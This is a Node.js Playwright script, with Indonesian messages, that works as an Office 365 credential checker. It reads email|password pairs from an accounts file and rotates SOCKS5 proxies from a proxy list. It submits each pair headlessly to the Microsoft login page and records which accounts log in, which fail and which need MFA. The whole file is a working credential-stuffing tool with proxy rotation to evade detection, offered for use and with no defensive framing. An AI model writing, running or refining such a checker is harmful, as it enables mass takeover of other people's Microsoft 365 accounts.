const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');

function colorize(text, color) {
  const colors = {
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
    reset: '\x1b[0m'
  };

  return `${colors[color] || ''}${text}${colors.reset}`;
}

function getFileContent(fileName) {
  const fs = require('fs');
  const path = require('path');
  const localPath = path.join(process.env.HOME || '', '.office365-playwright', fileName);
  const repoPath = path.join(__dirname, fileName);

  if (fs.existsSync(localPath)) {
    return fs.readFileSync(localPath, 'utf8');
  }

  if (fs.existsSync(repoPath)) {
    return fs.readFileSync(repoPath, 'utf8');
  }

  return '';
}

function getProxyConfigs() {
  const raw = getFileContent('proxy.txt');
  return raw.split(/\r?\n/).map((value) => value.trim()).filter(Boolean);
}

function buildProxyConfig(proxyValue) {
  if (!proxyValue) {
    return null;
  }

  const normalized = proxyValue.trim();

  if (normalized.startsWith('socks5://') || normalized.startsWith('http://') || normalized.startsWith('https://')) {
    try {
      const parsed = new URL(normalized);
      const protocol = parsed.protocol === 'socks5h:' ? 'socks5://' : `${parsed.protocol}//`;
      const proxyConfig = { server: `${protocol}${parsed.host}` };

      if (parsed.username) {
        proxyConfig.username = decodeURIComponent(parsed.username);
      }

      if (parsed.password) {
        proxyConfig.password = decodeURIComponent(parsed.password);
      }

      return proxyConfig;
    } catch {
      return null;
    }
  }

  const parts = normalized.split(':');
  if (parts.length >= 4) {
    const host = parts[0];
    const port = parts[1];
    const username = parts[2];
    const password = parts.slice(3).join(':');

    return {
      server: `socks5://${host}:${port}`,
      username,
      password
    };
  }

  return null;
}

function appendLog(message) {
  const logFile = path.join(__dirname, 'login-log.txt');
  const timestamp = new Date().toISOString();
  fs.appendFileSync(logFile, `[${timestamp}] ${message}\n`);
}

async function waitForAny(page, selectors, timeout = 10000) {
  const deadline = Date.now() + timeout;

  for (const selector of selectors) {
    try {
      const locator = page.locator(selector).first();
      await locator.waitFor({ state: 'visible', timeout: Math.max(2000, deadline - Date.now()) });
      return locator;
    } catch {
      // lanjut ke selector berikutnya
    }
  }

  return null;
}

async function clickPrimary(page) {
  const buttons = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button:has-text("Next")',
    'button:has-text("Sign in")',
    'button:has-text("Masuk")'
  ];

  const button = await waitForAny(page, buttons, 10000);
  if (!button) {
    return false;
  }

  await button.click();
  return true;
}

(async () => {
  const mfaCode = process.env.OFFICE365_MFA_CODE;
  const localFilePath = path.join(process.env.HOME || '', '.office365-playwright', 'accounts.txt');
  const repoFilePath = path.join(__dirname, 'accounts.txt');
  const filePath = fs.existsSync(localFilePath) ? localFilePath : repoFilePath;

  if (!fs.existsSync(filePath)) {
    console.error('File accounts.txt tidak ditemukan');
    process.exit(1);
  }

  const lines = fs.readFileSync(filePath, 'utf8').split(/\r?\n/).filter(Boolean);
  if (lines.length === 0) {
    console.error('accounts.txt kosong');
    process.exit(1);
  }

  const proxyConfigs = getProxyConfigs();

  let browser;
  try {
    browser = await chromium.launch({ headless: true });

    for (const [index, line] of lines.entries()) {
      const [email, password] = line.split('|').map((value) => value.trim());
      if (!email || !password) continue;

      const proxyConfig = proxyConfigs.length ? buildProxyConfig(proxyConfigs[index % proxyConfigs.length]) : null;
      const context = await browser.newContext({
        viewport: { width: 1440, height: 1200 },
        ...(proxyConfig ? { proxy: proxyConfig } : {})
      });
      const page = await context.newPage();
      try {
        await context.clearCookies();
        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' });
        await page.waitForLoadState('networkidle').catch(() => {});

        const emailInput = await waitForAny(page, ['input[type="email"]', 'input[name="loginfmt"]', 'input[name="email"]']);
        if (!emailInput) throw new Error('Tidak menemukan field email');
        console.log(`Email dimasukkan: ${email}`);
        await emailInput.fill(email);
        await clickPrimary(page);

        const passwordInput = await waitForAny(page, ['input[type="password"]', 'input[name="passwd"]', 'input[name="password"]'], 20000);
        if (!passwordInput) {
          console.log('Lewati karena halaman tidak menampilkan field password');
          appendLog(`${email}|GAGAL|password_form_not_found`);
          continue;
        }

        await passwordInput.fill(password);
        await clickPrimary(page);

        console.log('Menunggu proses login dan MFA...');
        await page.waitForTimeout(5000);

        const mfaInput = await waitForAny(page, ['input[name="otc"]', 'input[aria-label*="code" i]', 'input[type="text"][autocomplete="one-time-code"]'], 15000);

        if (mfaInput) {
          if (!mfaCode) {
            console.log(`[${index}]${email}   ${colorize('[2FA]', 'yellow')}`);
            appendLog(`${email}|2FA|mfa_required`);
            continue;
          }

          await mfaInput.fill(mfaCode);
          await clickPrimary(page);
        }

        await page.waitForTimeout(5000);

        const title = await page.title();
        const url = page.url();
        const lowerTitle = (title || '').toLowerCase();
        const lowerUrl = (url || '').toLowerCase();

        if (
          lowerUrl.includes('office.com') ||
          lowerUrl.includes('outlook.office.com') ||
          lowerUrl.includes('microsoft365.com') ||
          lowerUrl.includes('sharepoint.com') ||
          lowerUrl.includes('myaccount.microsoft.com') ||
          lowerTitle.includes('microsoft 365') ||
          lowerTitle.includes('outlook')
        ) {
          console.log(`[${index}]${email}   ${colorize('[OK]', 'green')}`);
          appendLog(`${email}|SUKSES|${title}`);
        } else {
          console.log(`[${index}]${email}   ${colorize('[FAIL]', 'red')}`);
          appendLog(`${email}|GAGAL|${title}`);
        }
      } catch (err) {
        console.error(`Gagal login ${email}: ${err.message}`);
        appendLog(`${email}|GAGAL|${err.message}`);
      } finally {
        await page.close();
      }
    }
  } finally {
    if (browser) {
      await browser.close();
    }
  }
})();
